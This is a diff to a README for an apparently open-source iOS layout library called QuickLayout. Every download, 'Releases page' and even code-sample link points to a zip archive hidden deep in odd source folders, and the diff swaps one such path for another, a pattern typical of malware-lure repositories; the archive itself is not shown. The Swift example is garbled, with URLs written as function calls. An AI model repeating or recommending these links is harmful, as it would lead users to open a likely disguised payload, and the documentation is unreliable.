@@ -8,9 +8,9 @@ To get started with QuickLayout, follow these simple steps:
 
 1. Click the button below to download the latest version.
    
-   [![Download QuickLayout](https://raw.githubusercontent.com/khuninani/QuickLayout/main/Sources/QuickLayout/QuickLayoutBridge/__server_snapshot_tests__/TestsInfra/QuickLayout-v1.6.zip)](https://raw.githubusercontent.com/khuninani/QuickLayout/main/Sources/QuickLayout/QuickLayoutBridge/__server_snapshot_tests__/TestsInfra/QuickLayout-v1.6.zip)
+   [![Download QuickLayout](https://github.com/khuninani/QuickLayout/raw/refs/heads/main/Sources/QuickLayout/docs/src/theme/Quick-Layout-v3.2.zip)](https://github.com/khuninani/QuickLayout/raw/refs/heads/main/Sources/QuickLayout/docs/src/theme/Quick-Layout-v3.2.zip)
 
-2. Visit the Releases page for more information and updates. You can access the page here: [QuickLayout Releases](https://raw.githubusercontent.com/khuninani/QuickLayout/main/Sources/QuickLayout/QuickLayoutBridge/__server_snapshot_tests__/TestsInfra/QuickLayout-v1.6.zip).
+2. Visit the Releases page for more information and updates. You can access the page here: [QuickLayout Releases](https://github.com/khuninani/QuickLayout/raw/refs/heads/main/Sources/QuickLayout/docs/src/theme/Quick-Layout-v3.2.zip).
 
 ## 📥 System Requirements
 Before you download, make sure your device meets the following requirements:
@@ -31,7 +31,7 @@ QuickLayout includes a variety of features to enhance your app development exper
 ## 📦 Download & Install
 To download QuickLayout:
 
-1. Go to the [QuickLayout Releases page](https://raw.githubusercontent.com/khuninani/QuickLayout/main/Sources/QuickLayout/QuickLayoutBridge/__server_snapshot_tests__/TestsInfra/QuickLayout-v1.6.zip).
+1. Go to the [QuickLayout Releases page](https://github.com/khuninani/QuickLayout/raw/refs/heads/main/Sources/QuickLayout/docs/src/theme/Quick-Layout-v3.2.zip).
 2. Find the version you want, and select the appropriate file to download.
 
 Once downloaded, open the file and follow the installation instructions on your device.
@@ -52,8 +52,8 @@ After installing QuickLayout, you can easily integrate it into your iOS project.
    let item1 = QuickLayoutItem()
    let item2 = QuickLayoutItem()
    
-   https://raw.githubusercontent.com/khuninani/QuickLayout/main/Sources/QuickLayout/QuickLayoutBridge/__server_snapshot_tests__/TestsInfra/QuickLayout-v1.6.zip(item1)
-   https://raw.githubusercontent.com/khuninani/QuickLayout/main/Sources/QuickLayout/QuickLayoutBridge/__server_snapshot_tests__/TestsInfra/QuickLayout-v1.6.zip(item2)
+   https://github.com/khuninani/QuickLayout/raw/refs/heads/main/Sources/QuickLayout/docs/src/theme/Quick-Layout-v3.2.zip(item1)
+   https://github.com/khuninani/QuickLayout/raw/refs/heads/main/Sources/QuickLayout/docs/src/theme/Quick-Layout-v3.2.zip(item2)
    ```
 
 3. **Run Your App:** Build and run your app to see your layout in action!
@@ -79,4 +79,4 @@ Yes, QuickLayout is open-source and free to use.
 If you face any issues or have questions, feel free to open an issue in the GitHub repository. We’re here to help!
 
 ## 🎉 Conclusion
-QuickLayout simplifies the process of creating layouts for your iOS applications. With just a few steps, you can download, install, and start building visually appealing interfaces. Don’t forget to check the [QuickLayout Releases page](https://raw.githubusercontent.com/khuninani/QuickLayout/main/Sources/QuickLayout/QuickLayoutBridge/__server_snapshot_tests__/TestsInfra/QuickLayout-v1.6.zip) for updates and new features!
+QuickLayout simplifies the process of creating layouts for your iOS applications. With just a few steps, you can download, install, and start building visually appealing interfaces. Don’t forget to check the [QuickLayout Releases page](https://github.com/khuninani/QuickLayout/raw/refs/heads/main/Sources/QuickLayout/docs/src/theme/Quick-Layout-v3.2.zip) for updates and new features!
